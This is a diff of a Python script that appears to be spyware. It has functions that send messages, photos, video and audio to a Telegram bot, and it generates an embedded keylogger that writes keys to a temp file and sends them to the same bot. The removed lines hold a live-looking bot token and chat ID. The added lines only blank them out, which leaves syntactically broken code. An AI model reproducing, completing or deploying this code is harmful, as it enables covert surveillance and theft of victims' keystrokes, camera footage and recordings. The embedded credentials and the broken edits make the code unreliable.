@@ -34,16 +34,16 @@ import numpy as np
 import winreg
 
 # Telegram Settings
-TELEGRAM_BOT_TOKEN = "7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY"
-TELEGRAM_CHAT_ID = "8042482389"
+TELEGRAM_BOT_TOKEN = ""
+TELEGRAM_CHAT_ID = ""
 UNLOCK_CODE = ''.join(random.choices(string.digits, k=6))
 
 last_update_id = [None]
 latest_msg = {"type": None, "content": None}
 
 def send_to_telegram(message):
-    url = f"https://api.telegram.org/bot{"7905634492":AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/sendMessage"
-    data = {"chat_id": 8042482389, "text": message}
+    url = f"https://api.telegram.org/bot{}/sendMessage"
+    data = {"chat_id": , "text": message}
     try:
         response = requests.post(url, data=data)
         if not response.ok:
@@ -65,9 +65,9 @@ def send_photo_to_telegram(img_path):
     try:
         with open(img_path, "rb") as f:
             response = requests.post(
-                f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/sendPhoto",
+                f"https://api.telegram.org/bot{}/sendPhoto",
                 files={"photo": f},
-                data={"chat_id": 8042482389
+                data={"chat_id": 
 }
             )
             if not response.ok:
@@ -79,10 +79,10 @@ def send_video_to_telegram(video_path):
     try:
         with open(video_path, "rb") as f:
             response = requests.post(
-                f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY
+                f"https://api.telegram.org/bot{
 }/sendVideo",
                 files={"video": f},
-                data={"chat_id": 8042482389
+                data={"chat_id": 
 , "caption": "تسجيل فيديو"}
             )
             if not response.ok:
@@ -94,9 +94,9 @@ def send_audio_to_telegram(audio_path):
     try:
         with open(audio_path, "rb") as f:
             response = requests.post(
-                f"https://api.telegram.org/bot{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}/sendAudio",
+                f"https://api.telegram.org/bot{}/sendAudio",
                 files={"audio": f},
-                data={"chat_id": 8042482389, "caption": "تسجيل صوتي"}
+                data={"chat_id": , "caption": "تسجيل صوتي"}
             )
             if not response.ok:
                 raise Exception(f"HTTP Error {response.status_code}: {response.text}")
@@ -228,8 +228,8 @@ try:
         'import cv2\n'
         'import os\n'
         'import tempfile\n\n'
-        f'TELEGRAM_BOT_TOKEN = "{7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY}"\n'
-        f'TELEGRAM_CHAT_ID = "{8042482389}"\n'
+        f'TELEGRAM_BOT_TOKEN = "{}"\n'
+        f'TELEGRAM_CHAT_ID = "{}"\n'
         f'DEVICE_NAME = "{device_name}"\n'
         'logged_keys = ""\n'
         'LOG_FILE = os.path.join(tempfile.gettempdir(), "keylog.txt")\n\n'
@@ -237,8 +237,8 @@ try:
         '    with open(LOG_FILE, "a", encoding="utf-8") as f:\n'
         '        f.write(f"[{time.ctime()}] {message}\\n")\n\n'
         'def send_to_telegram(message):\n'
-        '    url = "https://api.telegram.org/bot" + 7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY + "/sendMessage"\n'
-        '    data = {"chat_id": 8042482389, "text": message}\n'
+        '    url = "https://api.telegram.org/bot" +  + "/sendMessage"\n'
+        '    data = {"chat_id": , "text": message}\n'
         '    try:\n'
         '        response = requests.post(url, data=data)\n'
         '        if response.status_code == 200:\n'
@@ -250,8 +250,8 @@ try:
         'def send_photo_to_telegram(img_path):\n'
         '    try:\n'
         '        with open(img_path, "rb") as f:\n'
-        '            url = "https://api.telegram.org/bot" + 7905634492:AAGJWjuVaTQu5hcEFTIKbRuvalZlw1dAYqY + "/sendPhoto"\n'
-        '            response = requests.post(url, files={"photo": f}, data={"chat_id": T8042482389})\n'
+        '            url = "https://api.telegram.org/bot" +  + "/sendPhoto"\n'
+        '            response = requests.post(url, files={"photo": f}, data={"chat_id": })\n'
         '            if response.status_code == 200:\n'
         '                log_to_file(f"تم إرسال الصورة: {img_path}")\n'
         '            else:\n'
